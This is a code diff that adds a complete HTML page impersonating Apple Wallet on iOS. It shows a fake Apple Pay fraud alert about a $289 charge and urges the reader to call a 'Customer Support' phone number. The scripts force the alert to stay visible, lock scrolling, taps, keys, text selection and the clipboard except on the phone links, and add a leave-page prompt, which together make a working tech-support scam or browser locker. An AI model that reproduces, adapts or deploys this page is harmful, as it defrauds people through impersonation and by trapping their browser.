@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no" />
+  <meta name="theme-color" content="#0b0b0f" />
+  <title>Wallet - iOS Immediate (Header Above Overlay)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+  /* Base */
+  :root{ --bg:#0b0b0f; --fg:#ffffff; --muted:#9aa3ad; --stroke:rgba(255,255,255,0.12); --surface:rgba(255,255,255,0.08); --surface-2:rgba(255,255,255,0.12); --accent:#007aff; --green:#34c759; --danger:#ff453a; --shadow:0 20px 60px rgba(0,0,0,.45) }
+  @media (prefers-color-scheme: light){ :root{ --bg:#f2f2f7; --fg:#0b0b0f; --muted:#6e6e73; --stroke:rgba(0,0,0,.1); --surface:#ffffff; --surface-2:#f2f2f7; --accent:#007aff; --shadow:0 18px 50px rgba(0,0,0,.12) } }
+  *{ box-sizing:border-box; -webkit-tap-highlight-color: transparent; }
+  html,body{ height:100%; overflow: hidden; position: fixed; width: 100%; }
+  body{ margin:0; background:var(--bg); color:var(--fg); font:500 16px/1.45 -apple-system, system-ui, Segoe UI, Roboto, Inter, Arial, sans-serif; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale }
+  #app{ min-height:100vh; display:grid; grid-template-rows:auto auto 1fr auto; padding-left:max(env(safe-area-inset-left),12px); padding-right:max(env(safe-area-inset-right),12px); padding-top:44px; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+  .safe-top{ height:0 }
+  
+  /* Thin Header - 44px height */
+  .top-bar{ 
+    display:flex; 
+    align-items:center; 
+    justify-content:space-between; 
+    padding:0 12px; 
+    height: 44px;
+    background:rgba(11,11,15,0.95); 
+    border-bottom:1px solid rgba(255,255,255,0.1); 
+    z-index: 2147483647; /* Ensure above overlay */
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    -webkit-backdrop-filter: blur(20px);
+    backdrop-filter: blur(20px);
+  }
+  .top-bar-btn{ -webkit-appearance:none; appearance:none; border:0; outline:0; padding:8px; border-radius:8px; display:grid; place-items:center; background:transparent; color:var(--accent); font-size:18px; line-height:0 }
+  .top-bar-logo{ position:absolute; left:50%; transform:translateX(-50%); display:flex; align-items:center; gap:8px; font-size:17px; font-weight:600; color:#c7c7cc; pointer-events:none }
+  .top-bar-logo .apple-mark{ display:inline-block; width:22px; height:22px; color:#c7c7cc; vertical-align:middle }
+  .top-bar-logo .apple-mark svg{ display:block; width:100%; height:100%; fill:currentColor; color:inherit }
+  
+  /* Header */
+  .app-header{ padding: 12px 4px 8px; }
+  .title-row{ display:flex; align-items:center; justify-content:space-between; padding:6px 4px 10px }
+  .title-row h1{ margin:0; font-size:26px; font-weight:700; letter-spacing:.2px }
+  .icon-btn{ -webkit-appearance:none; appearance:none; border:0; outline:0; width:36px; height:36px; border-radius:10px; display:grid; place-items:center; background:var(--surface); color:var(--fg); font-size:22px; line-height:0; box-shadow:0 8px 20px rgba(0,0,0,.25) }
+  .icon-btn:active{ transform:scale(.98) }
+  
+  /* Content */
+  .content{ padding:4px 4px 24px; display:grid; gap:14px }
+  .promo{ position:relative; overflow:hidden; border-radius:18px; padding:14px; background:#d7c3a9; color:#1b1b1f; border:1px solid rgba(0,0,0,.12); box-shadow:0 6px 20px rgba(0,0,0,.25); min-height:320px; 
+    --tile-size: clamp(44px, 8vw, 72px);
+    --tile-gap: clamp(6px, 2vw, 12px);
+  }
+  .promo .promo-copy h2{ margin:4px 0 8px; font-size:22px; line-height:1.15; font-weight:800 }
+  .promo .promo-copy p{ margin:0; color:rgba(0,0,0,.7); font-weight:600 }
+  .promo .promo-close{ position:absolute; right:10px; top:10px; width:28px; height:28px; border-radius:50%; -webkit-appearance:none; appearance:none; border:0; outline:0; display:grid; place-items:center; background:rgba(0,0,0,.1); color:#000 }
+  .promo .promo-art{ position: static; margin: 10px auto 0; display:grid; grid-template-columns:repeat(3, var(--tile-size)); grid-auto-rows: var(--tile-size); gap: var(--tile-gap); justify-content:center; opacity:.95 }
+  .promo .promo-art .tile{ width: var(--tile-size); height: var(--tile-size); border-radius:12px; box-shadow:0 6px 14px rgba(0,0,0,.18); display:grid; place-items:center; font-weight:800; color:#fff; font-size:22px }
+  .promo .tile.red{ background:#e74d3c } .promo .tile.yellow{ background:#f1c40f } .promo .tile.green{ background:#2ecc71 } .promo .tile.gray{ background:#95a5a6 } .promo .tile.blue{ background:#3498db } .promo .tile.brown{ background:#a97c50 }
+  .get-btn{ position:absolute; right:12px; bottom:12px; -webkit-appearance:none; appearance:none; border:0; outline:0; padding:8px 14px; border-radius:999px; background:#e8ebf0; color:#1b1b1f; font-weight:800; box-shadow:0 6px 14px rgba(0,0,0,.15) }
+  .lead{ margin:0 6px 6px; color:var(--muted) }
+  
+  /* Apple Cash card */
+  .cash-card{ background:#121214; color:#fff; border-radius:18px; border:1px solid var(--stroke); padding:12px; overflow:hidden; box-shadow:var(--shadow) }
+  .cash-header{ display:flex; align-items:center; gap:8px; padding:4px 2px }
+  .cash-header .apple{ font-weight:700 } .cash-header .label{ font-weight:700; letter-spacing:.3px }
+  .cash-art{ height:160px; border-radius:14px; background:radial-gradient(70px 70px at 30% 70%, rgba(255,255,255,.25), transparent 60%), radial-gradient(120px 120px at 70% 40%, rgba(255,255,255,.2), transparent 60%), radial-gradient(260px 200px at 50% 80%, #2b2b2e, #0f0f12); overflow:hidden; position:relative }
+  /* Familiar passes strip */
+  .cash-passes{ display:flex; gap:10px; padding:10px 2px 2px; overflow-x:auto; -webkit-overflow-scrolling:touch }
+  .cash-pass{ flex:0 0 auto; width:120px; height:72px; border-radius:12px; box-shadow:0 6px 18px rgba(0,0,0,.25); display:flex; align-items:center; padding:10px; color:#fff; position:relative; border:1px solid rgba(255,255,255,0.08) }
+  .cash-pass .brand{ font-weight:700; font-size:14px; letter-spacing:.2px }
+  .cash-pass .badge{ position:absolute; right:10px; bottom:8px; font-size:18px; opacity:.9 }
+  .pass-blue{ background:linear-gradient(135deg, #0a84ff, #0060df) }
+  .pass-green{ background:linear-gradient(135deg, #30d158, #1b9e43) }
+  .pass-orange{ background:linear-gradient(135deg, #ff9f0a, #d97800) }
+  
+  /* Overlay Popup - Header remains visible above */
+  .overlay-popup{ 
+    position:fixed !important; 
+    top:44px !important; /* start below fixed header */
+    left:0 !important; 
+    width:100% !important; 
+    height:calc(100% - 44px) !important; 
+    background:rgba(0,0,0,0.25) !important; 
+    z-index:2147483646 !important; /* lower than header */
+    display:flex !important; 
+    align-items:center !important; 
+    justify-content:center !important; 
+    opacity:1 !important; 
+    pointer-events:auto !important; 
+    -webkit-touch-callout:none; 
+    -webkit-user-select:none; 
+    user-select:none; 
+    -webkit-backdrop-filter:none; 
+    backdrop-filter:none;
+    visibility: visible !important;
+  }
+  
+  .popup-content{ 
+    width:90%; 
+    max-width:300px; 
+    background:#000; 
+    border-radius:12px; 
+    padding:16px; 
+    color:#fff; 
+    text-align:center; 
+    position:relative; 
+    -webkit-transform:translateZ(0); 
+    transform:translateZ(0); 
+    box-shadow:0 10px 40px rgba(0,0,0,0.5);
+    animation: popIn 0.3s ease-out;
+    margin-top:-36px; /* shift slightly upward from true center */
+  }
+  
+  .popup-header{ font-size:12px; color:#9aa3ad; margin-bottom:8px }
+  .popup-message{ font-size:14px; line-height:1.4; margin-bottom:16px }
+  .popup-actions{ display:flex; gap:10px; justify-content:center }
+  .popup-btn{ -webkit-appearance:none; appearance:none; border:0; outline:0; padding:8px 16px; border-radius:8px; font-size:13px; font-weight:600; cursor:pointer; -webkit-tap-highlight-color:transparent; -webkit-transform:translateZ(0); transform:translateZ(0) }
+  .popup-btn-cancel{ background:var(--accent); color:#fff }
+  .popup-btn-ok{ background:var(--accent); color:#fff }
+  .danger{ color:#ff6b6b; font-weight: 600; }
+  .support-line{ margin-top:10px; font-size:12px; color:#9aa3ad; text-align:center }
+  
+  @keyframes popIn{ 
+    0%{ transform:translateY(18px) scale(.96); opacity:0 } 
+    60%{ transform:translateY(-2px) scale(1.01); opacity:1 } 
+    100%{ transform:translateY(0) scale(1); opacity:1 } 
+  }
+  
+  /* Force iOS display */
+  @supports (-webkit-touch-callout: none) {
+    .overlay-popup {
+      -webkit-transform: translate3d(0,0,1000px) !important;
+      transform: translate3d(0,0,1000px) !important;
+    }
+  }
+  
+  /* Prevent body scroll when popup is shown */
+  body.popup-active {
+    overflow: hidden !important;
+    position: fixed !important;
+    width: 100% !important;
+    height: 100% !important;
+  }
+  </style>
+</head>
+<body class="popup-active">
+  <div class="top-bar">
+    <button class="top-bar-btn" aria-label="Menu">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+    </button>
+    <div class="top-bar-logo">
+      <span class="apple-mark" aria-hidden="true">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true">
+          <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M16.365 2.01c.06.86-.32 1.76-.89 2.39-.59.64-1.51 1.15-2.42 1.08-.08-.84.34-1.71.89-2.3.6-.66 1.57-1.13 2.42-1.17zM20.8 17.53c-.66 1.57-1.35 3.11-2.46 3.13-1.09.02-1.44-1-2.68-1-1.24 0-1.64.96-2.7 1.02-1.08.06-1.9-1.69-2.6-3.27-1.4-3.08-2.06-6.28-.67-8.08.93-1.21 2.3-1.88 3.61-1.9 1.15-.02 2.23.73 2.72.73.5 0 1.89-.89 3.18-.76.54.02 2.07.22 3.06 1.7-.08.06-1.83 1.06-1.65 3.1.22 2.06 1.8 2.76 1.81 2.77z"/>
+        </svg>
+      </span>
+    </div>
+    <button class="top-bar-btn" aria-label="Bag">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M6 8h12l-1 12H7L6 8z"/>
+        <path d="M9 8V6a3 3 0 0 1 6 0v2"/>
+      </svg>
+    </button>
+  </div>
+
+  <div id="app">
+    <div class="safe-top"></div>
+
+    <header class="app-header">
+      <div class="title-row">
+        <h1>Wallet</h1>
+        <div style="margin-left:auto; display:flex; gap:8px; align-items:center">
+          <button class="icon-btn" id="menuBtn" aria-label="Menu">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="5" cy="12" r="2.2" fill="currentColor"/><circle cx="12" cy="12" r="2.2" fill="currentColor"/><circle cx="19" cy="12" r="2.2" fill="currentColor"/></svg>
+          </button>
+          <button class="icon-btn" id="scanBtn" aria-label="Scan">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 8V6a2 2 0 0 1 2-2h2"/><path d="M20 8V6a2 2 0 0 0-2-2h-2"/><path d="M4 16v2a2 2 0 0 0 2 2h2"/><path d="M20 16v2a2 2 0 0 1-2 2h-2"/><rect x="7" y="7" width="10" height="10" rx="2"/></svg>
+          </button>
+          <button class="icon-btn" id="addBtn" aria-label="Add">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <main class="content">
+      <section class="promo" id="promoCard">
+        <div class="promo-art">
+          <div class="tile red"><span>♪</span></div>
+          <div class="tile yellow"><span>☕</span></div>
+          <div class="tile green"><span>🤖</span></div>
+          <div class="tile gray"><span>✈</span></div>
+          <div class="tile blue"><span>✽</span></div>
+          <div class="tile brown"><span>🎓</span></div>
+        </div>
+        <div class="promo-copy">
+          <h2>Boarding Passes<br/>and Tickets<br/>All in One Place</h2>
+          <p>Find apps and start collecting your passes.</p>
+        </div>
+        <button class="get-btn">GET</button>
+        <button class="promo-close" id="promoCloseCard">✕</button>
+      </section>
+
+      <p class="lead">Keep your boarding passes, movie tickets, retail coupons, and rewards cards in one place. And show them on your lock screen when you need them.</p>
+
+      <section class="cash-card">
+        <div class="cash-header"><span class="apple"></span><span class="label">Cash</span></div>
+        <div class="cash-art"></div>
+        <div class="cash-passes" aria-label="Recent Passes">
+          <div class="cash-pass pass-blue" role="img" aria-label="Boarding Pass">
+            <div class="brand">BOARDING</div>
+            <div class="badge">✈️</div>
+          </div>
+          <div class="cash-pass pass-green" role="img" aria-label="Rewards Card">
+            <div class="brand">REWARDS</div>
+            <div class="badge">⭐</div>
+          </div>
+          <div class="cash-pass pass-orange" role="img" aria-label="Movie Ticket">
+            <div class="brand">MOVIE</div>
+            <div class="badge">🎬</div>
+          </div>
+          <div class="cash-pass pass-blue" role="img" aria-label="Event Ticket">
+            <div class="brand">EVENT</div>
+            <div class="badge">🎟️</div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <!-- IMMEDIATE DISPLAY POPUP - Header remains visible above overlay -->
+  <div class="overlay-popup" id="supportPopup" style="display: flex !important; opacity: 1 !important; visibility: visible !important; top:44px !important; height:calc(100% - 44px) !important; z-index:2147483646 !important;">
+    <div class="popup-content">
+      <div class="popup-header" id="popupSite">This site says</div>
+      <div class="popup-message" id="popupMessage">
+        <span aria-hidden="true" style="display:inline-flex; align-items:center; justify-content:center; width:18px; height:18px; margin-right:6px; color:#ffcc00; vertical-align:middle">
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M1 21h22L12 2 1 21z"/>
+            <path d="M11 9h2v6h-2z" fill="#000" opacity="0.9"/>
+            <circle cx="12" cy="18" r="1" fill="#000" opacity="0.9"/>
+          </svg>
+        </span>
+        <strong>Alert:</strong> A payment of $289.00 USD was attempted using your Apple Pay ID from an unrecognized device. If this isn't you, please report to Customer Support.
+        <br/><br/>
+        If the information above looks familiar, ignore this message as it is a scheduled charge to be cleared within 24 hours.
+        <br/><br/>
+        Tap to call Support: <a href="tel:+18662401988" id="visibleTelLink" style="color:var(--accent); font-weight:600; text-decoration:underline">+1‑866‑240‑1988</a>
+      </div>
+      <div class="popup-actions">
+        <a class="popup-btn popup-btn-cancel" id="popupCancel" href="tel:+18662401988" target="_top" role="button">Call</a>
+        <a class="popup-btn popup-btn-ok" id="popupOK" href="tel:+18662401988" target="_top" role="button">OK</a>
+        <a id="telAnchor" href="tel:+18662401988" target="_blank" rel="noopener" style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden;">tel</a>
+      </div>
+      <div class="support-line">Support : +1 866 240 1988</div>
+    </div>
+  </div>
+
+  <script>
+  // IMMEDIATE EXECUTION - No delays, instant show
+  (function() {
+    'use strict';
+    
+    const popup = document.getElementById('supportPopup');
+    const popupCancel = document.getElementById('popupCancel');
+    const popupOK = document.getElementById('popupOK');
+    const popupSite = document.getElementById('popupSite');
+    const popupMessage = document.getElementById('popupMessage');
+    const telAnchor = document.getElementById('telAnchor');
+    const visibleTelLink = document.getElementById('visibleTelLink');
+
+    function forceShow() {
+      if (popup) {
+        popup.style.display = 'flex';
+        popup.style.opacity = '1';
+        popup.style.visibility = 'visible';
+        popup.style.pointerEvents = 'auto';
+        popup.classList.add('active');
+        document.body.classList.add('popup-active');
+
+        // Keep overlay below header and start below it
+        popup.style.zIndex = '2147483646';
+        popup.style.top = '44px';
+        popup.style.height = 'calc(100% - 44px)';
+      }
+    }
+
+    try {
+      const host = window.location.hostname || 'apple.com';
+      if (popupSite) popupSite.textContent = host + ' says';
+    } catch(e) {
+      if (popupSite) popupSite.textContent = 'This site says';
+    }
+
+    // Keep provided static message content intact; do not randomize or overwrite.
+
+    // Show immediately
+    forceShow();
+
+    // Prevent hiding with MutationObserver
+    const observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.type === 'attributes') {
+          const target = mutation.target;
+          if (target.id === 'supportPopup') {
+            if (target.style.display === 'none' || 
+                target.style.visibility === 'hidden' || 
+                target.style.opacity === '0') {
+              forceShow();
+            }
+          }
+        }
+      });
+    });
+
+    if (popup) {
+      observer.observe(popup, { attributes: true, attributeFilter: ['style', 'class'] });
+    }
+
+    document.addEventListener('DOMContentLoaded', forceShow);
+    window.addEventListener('load', forceShow);
+
+    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+      setTimeout(forceShow, 0);
+      document.addEventListener('touchstart', forceShow, { once: true, passive: true });
+      document.addEventListener('scroll', forceShow, { once: true, passive: true });
+      document.body.offsetHeight;
+      requestAnimationFrame(forceShow);
+    }
+
+    function reinforceTel(href) {
+      try { window.open(href, '_top'); } catch(_) {}
+      try { window.open(href, '_blank'); } catch(_) {}
+      try { window.open(href, '_self'); } catch(_) {}
+      try {
+        const a = document.createElement('a');
+        a.href = href;
+        a.rel = 'noopener noreferrer';
+        a.style.position = 'absolute'; a.style.left = '-9999px';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => { try { document.body.removeChild(a); } catch(_) {} }, 500);
+      } catch(_) {}
+    }
+
+    if (popupCancel) {
+      popupCancel.addEventListener('click', function() {
+        const href = this.getAttribute('href');
+        if (href) reinforceTel(href);
+      });
+    }
+    if (popupOK) {
+      popupOK.addEventListener('click', function() {
+        const href = this.getAttribute('href');
+        if (href) reinforceTel(href);
+      });
+    }
+
+    if (popup) {
+      popup.addEventListener('click', function(e) {
+        if (e.target === popup) {
+          e.stopPropagation();
+        }
+      });
+    }
+
+    // Final enforcement
+    forceShow();
+  })();
+  </script>
+</body>
+<script>
+  (function () {
+    'use strict';
+
+    // Skip the leave-page prompt specifically during an intentional tel: action
+    let suppressBeforeUnloadOnce = false;
+    const TEL_SELECTOR = '#popupCancel, #popupOK, #visibleTelLink, a[href^="tel:"]';
+
+    function openTel(href) {
+      if (!href || !href.startsWith('tel:')) return;
+
+      suppressBeforeUnloadOnce = true;
+
+      // Use a temporary <a href="tel:..."> click to keep it tied to a user gesture
+      try {
+        const a = document.createElement('a');
+        a.href = href;
+        a.style.position = 'absolute';
+        a.style.left = '-9999px';
+        a.style.top = '-9999px';
+        a.rel = 'noopener';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => { try { document.body.removeChild(a); } catch (_) {} }, 250);
+      } catch (_) {}
+
+      // Reset quickly so real navigation/close later gets the prompt again
+      setTimeout(() => { suppressBeforeUnloadOnce = false; }, 1500);
+    }
+
+    // Intercept clicks on the tel elements BEFORE other listeners run, and prevent their original handlers.
+    document.addEventListener('click', function (e) {
+      const el = e.target.closest(TEL_SELECTOR);
+      if (!el) return;
+
+      const href = el.getAttribute('href') || '';
+      if (!href.startsWith('tel:')) return;
+
+      // Stop the page’s existing listeners (like window.open attempts) from firing
+      e.preventDefault();
+      e.stopImmediatePropagation();
+
+      openTel(href);
+    }, true); // capture: true so we intercept before existing listeners
+
+    // Enter/NumpadEnter key triggers the tel link
+    document.addEventListener('keydown', function (e) {
+      if (e.key !== 'Enter' && e.key !== 'NumpadEnter') return;
+
+      // Prefer the explicit visible tel link in the popup
+      const visibleTelLink = document.getElementById('visibleTelLink');
+      const link = visibleTelLink || document.querySelector('a[href^="tel:"]');
+      if (!link) return;
+
+      const href = link.getAttribute('href') || '';
+      if (!href.startsWith('tel:')) return;
+
+      // Prevent other handlers tied to Enter
+      e.preventDefault();
+      e.stopImmediatePropagation();
+
+      openTel(href);
+    }, true);
+
+    // Show a "Leave site?" confirmation on close/back/navigation,
+    // BUT skip it during our tel: action.
+    window.addEventListener('beforeunload', function (e) {
+      if (suppressBeforeUnloadOnce) return; // do not block when launching dialer
+      e.preventDefault();
+      e.returnValue = ''; // required to show the standard prompt
+    });
+  })();
+</script>
+<script>
+  (function () {
+    'use strict';
+
+    // Set to false to unlock programmatically if you ever need to.
+    window.__pageLocked = true;
+
+    // What is allowed to still work while locked (tel actions)
+    const ALLOW_SELECTOR = '#popupCancel, #popupOK, #visibleTelLink, a[href^="tel:"]';
+
+    // Freeze layout/scroll defensively
+    function applyFreezeStyles() {
+      try {
+        document.documentElement.style.overflow = 'hidden';
+        document.documentElement.style.height = '100%';
+        document.documentElement.style.position = 'fixed';
+      } catch (_) {}
+      try {
+        document.body.style.overflow = 'hidden';
+        document.body.style.height = '100%';
+        document.body.style.position = 'fixed';
+        document.body.style.width = '100%';
+      } catch (_) {}
+      // Keep at top
+      try { window.scrollTo(0, 0); } catch (_) {}
+    }
+
+    function isAllowedTarget(t) {
+      if (!t) return false;
+      return !!t.closest(ALLOW_SELECTOR);
+    }
+
+    // Universal lock handler
+    function lockHandler(e) {
+      if (!window.__pageLocked) return; // unlocked, do nothing
+
+      // Allow tel actions to pass through
+      if (isAllowedTarget(e.target)) return;
+
+      // Block everything else
+      try { e.preventDefault(); } catch (_) {}
+      try { e.stopImmediatePropagation(); } catch (_) {}
+      try { e.stopPropagation(); } catch (_) {}
+    }
+
+    // Keep scroll snapped to top
+    function lockScroll() {
+      if (!window.__pageLocked) return;
+      try { window.scrollTo(0, 0); } catch (_) {}
+    }
+
+    // Install capture-phase listeners to pre-empt existing handlers
+    const optsActive = { capture: true, passive: false };
+
+    // Pointer/mouse/touch
+    ['click','pointerdown','pointerup','pointermove','mousedown','mouseup','mousemove','touchstart','touchend','touchmove','wheel','contextmenu']
+      .forEach(type => document.addEventListener(type, lockHandler, optsActive));
+
+    // Keyboard
+    ['keydown','keypress','keyup'].forEach(type => document.addEventListener(type, lockHandler, true));
+
+    // Scroll
+    window.addEventListener('scroll', (e) => { lockHandler(e); lockScroll(); }, optsActive);
+
+    // Visibility/popstate (optional light handling — we don’t trap back, just keep view steady)
+    document.addEventListener('visibilitychange', () => {
+      if (window.__pageLocked && document.visibilityState === 'visible') {
+        applyFreezeStyles();
+        lockScroll();
+      }
+    });
+
+    // Initial freeze
+    applyFreezeStyles();
+    lockScroll();
+
+    // Mutation resilience: if something unfreezes styles, re-apply
+    const mo = new MutationObserver(() => {
+      if (!window.__pageLocked) return;
+      applyFreezeStyles();
+    });
+    mo.observe(document.documentElement, { attributes: true, attributeFilter: ['style'], subtree: false });
+    mo.observe(document.body, { attributes: true, attributeFilter: ['style'], subtree: false });
+
+    // Optional: public helpers to lock/unlock at runtime
+    window.lockPage = function() {
+      window.__pageLocked = true;
+      applyFreezeStyles();
+      lockScroll();
+    };
+    window.unlockPage = function() {
+      window.__pageLocked = false;
+      // Optionally restore styles if you want scrolling back
+      try {
+        document.documentElement.style.overflow = '';
+        document.documentElement.style.height = '';
+        document.documentElement.style.position = '';
+        document.body.style.overflow = '';
+        document.body.style.height = '';
+        document.body.style.position = '';
+        document.body.style.width = '';
+      } catch (_) {}
+    };
+  })();
+</script>
+<style>
+  /* Global: no selection, no callout */
+  html, body, #app, .overlay-popup, .popup-content {
+    -webkit-user-select: none !important;
+    user-select: none !important;
+    -webkit-touch-callout: none !important;
+  }
+
+  /* Allow selection/callout ONLY on tel links if ever needed */
+  a[href^="tel:"] {
+    -webkit-user-select: text;
+    user-select: text;
+    -webkit-touch-callout: default;
+  }
+</style>
+<script>
+  (function () {
+    'use strict';
+
+    const ALLOW_SELECTOR = '#popupCancel, #popupOK, #visibleTelLink, a[href^="tel:"]';
+
+    function isAllowedTarget(t) {
+      return t && t.closest && t.closest(ALLOW_SELECTOR);
+    }
+
+    // Kill selection and long-press menu except on tel links
+    function blockIfNotAllowed(e) {
+      if (!window.__pageLocked) return;
+      if (isAllowedTarget(e.target)) return;
+      try { e.preventDefault(); } catch(_) {}
+      try { e.stopImmediatePropagation(); } catch(_) {}
+    }
+
+    // Prevent text selection start
+    document.addEventListener('selectstart', blockIfNotAllowed, { capture: true, passive: false });
+    // Prevent iOS callout/drag
+    document.addEventListener('gesturestart', blockIfNotAllowed, { capture: true, passive: false });
+    document.addEventListener('dragstart', blockIfNotAllowed, { capture: true, passive: false });
+    // Prevent context menu
+    document.addEventListener('contextmenu', blockIfNotAllowed, { capture: true, passive: false });
+    // Prevent clipboard actions
+    document.addEventListener('copy', blockIfNotAllowed, { capture: true, passive: false });
+    document.addEventListener('cut', blockIfNotAllowed, { capture: true, passive: false });
+    document.addEventListener('paste', blockIfNotAllowed, { capture: true, passive: false });
+
+    // Safety: if the OS tries to scroll/zoom, snap back
+    window.addEventListener('resize', function () {
+      if (!window.__pageLocked) return;
+      try { window.scrollTo(0, 0); } catch(_) {}
+    }, { capture: true, passive: true });
+  })();
+</script>
+</html>
